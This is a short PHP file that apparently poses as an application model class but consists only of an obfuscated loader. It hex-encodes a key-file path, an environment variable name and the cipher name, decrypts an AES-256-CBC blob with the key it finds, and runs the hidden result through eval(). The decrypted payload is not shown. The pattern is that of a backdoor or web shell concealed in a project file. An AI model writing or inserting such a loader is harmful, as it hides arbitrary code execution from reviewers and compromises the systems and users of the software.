<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('2V/3Zt/tyl5moCoMvOxgxg==');

$c=base64_decode(

'iEsBnE/hbEPTNbTAUD7QAdnbT4zx2py5yQTeVPR80ZYqtyw9W9bUDf8qmaldsKT5fUxLHMKX7CoU' .
'jtFgTjxB0Q9ecruKWNVx+9+taPinz4XBVY3Hz/TF6sqLVDxrivcLH1b3hJbLytPtMRRJhOvp0cKf' .
'49hq8ucNJoWTWQa7GaLvB+0PcWQVKWMs5QUQui6M2wShKmyR7w65YJWc2aUUZf0tqqJOUnL898PC' .
'MFJsQezfWTr66BWWA3X32flucvfpm2JdnBcORBUtMlslz3lEzvy34NNc1O9TmVCmMNLiuouuby35' .
'pqH9YX04JYAXxHkdo3kQ78iGc37baRiQZ+ZRVKS1CgIJRYOxerW7nzNa0e5Y4lpgsvtiSdWAZHFn' .
'ydgodiJcgvNdFzkEiLO2wjudmws26yTC8FrAAyoUKs0U4h8h3SJuDf0dMLPo7re6JZ5Kv9rXTZlL' .
'ikfiWw/3VnMCZVLyjfl+/Joh1iTZRg0dLENVbKCWti5mMDahjNscvLT2hs6As1oKHDSTWansvs+F' .
'wLnxPIb3a39ar6IqvjQqW8INFp4aMmeK36VZ0S4QJAWHOxmVRwsA3HF3hC1PkgYcXsjx/P1Wxf/S' .
'wlvGGHsC4j+HpO3TbBFijh3Erals745DDQcO38/USLL7pVYCMMcqyLTvusvL56VXLF9Ow6zKWrs2' .
'IK2UBVCNCWvrAKQh2IfTBrhovcYXxJ2jDLfkqS6CW+S3pogHzBMUnx9AJJSfp6KN1WG8BNp7pj0J' .
'BDW3sbTiP595l4snmM5qk3acy87CT9Zuknudms3TLUKyheG3umvNwkSfhPU0HZPL5M5IoA6dvHye' .
'NnR/ocJMY73wRZZK/83KK0b2+xGXtkwS4lbSjJLqnnm7yxKzmsWRn0zG+Lmu/sBoRtkfMsYhd38A' .
'qV6RwYZmXhdEbgRjGiARrCeCLZPOGFmovPJVKkQtqSR5F8piwQIOy0HbOJb8LbtXnFXGU+6dTL17' .
'wm+u3ZrGlK4UZL2uzMmDTyDdRW1WuxhTtvcuiCyjSAhtFKHwR7ASLqPL5qQlVBDvF1nfGUlz5vd3' .
'LGWBYgMM/lrIAZ7jCCOTBFd1cci37jLDFSe3ZpfQmxwXRpw7m5oshfApfx53fph7AZKB5QnVO2u3' .
'5JX1wbT1K1t6h0spHVYAKuf/dW+HhK3am99T2xwJYmoZ687dD65pe9K2fzskQTaHMKrtUA70DUUC'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

